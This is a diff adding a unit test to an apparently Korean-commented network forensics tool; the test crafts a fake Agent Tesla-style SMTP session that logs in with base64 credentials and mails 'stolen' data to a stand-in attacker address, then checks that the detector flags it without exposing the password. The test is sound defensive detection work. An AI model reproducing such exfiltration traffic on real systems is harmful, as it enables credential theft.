@@ -63,6 +63,36 @@ class TestDetectors(unittest.TestCase):
         # 정상 도메인(naver 등)은 탐지에 등장하면 안 된다
         self.assertFalse(any("naver" in t for t in _titles(r)))
 
+    def test_smtp_cleartext_credentials(self):
+        # Agent Tesla 류: SMTP AUTH LOGIN(base64) + 메일 유출 (QA 이미지 03 패턴)
+        import base64 as b64
+        from pcapfor import craft
+        pkts = []
+        flow = craft.TcpFlow(pkts, "192.168.1.27", 51958, "203.0.113.25", 587)
+        flow.handshake(1.0)
+        flow.send(1.01, b"220-mail.example ESMTP ready\r\n", c2s=False)
+        user = b64.b64encode(b"stealer@example.in")
+        pw = b64.b64encode(b"S3cret#1")
+        flow.send(1.02, b"EHLO VICTIM-PC\r\nAUTH login " + user + b"\r\n" + pw +
+                  b"\r\nMAIL FROM:<stealer@example.in>\r\nRCPT TO:<drop@evil.example>\r\n"
+                  b"DATA\r\nSubject: PW_VICTIM-PC\r\n\r\nstolen...\r\n.\r\nQUIT\r\n")
+        flow.send(1.03, b"235 ok\r\n", c2s=False)
+        flow.close(1.1)
+        f = tempfile.NamedTemporaryFile(delete=False, suffix=".pcap")
+        f.close()
+        write_pcap(f.name, pkts)
+        try:
+            r = analyze(f.name)
+        finally:
+            os.unlink(f.name)
+        creds = [x for x in r.findings if x.category == "credential"]
+        self.assertEqual(len(creds), 1)
+        self.assertIn("SMTP", creds[0].title)
+        ev = " ".join(creds[0].evidence)
+        self.assertIn("stealer@example.in", ev)
+        self.assertIn("drop@evil.example", ev)
+        self.assertNotIn("S3cret", ev)  # 비밀번호 원문은 노출 금지
+
     def test_dns_tunneling_iodine_pattern(self):
         # 실측(QA 이미지 04) 기반: 반복 폴링이라 고유율·엔트로피는 낮지만
         # 평균 길이가 극단적이고 qtype 이 NULL 인 iodine 패턴
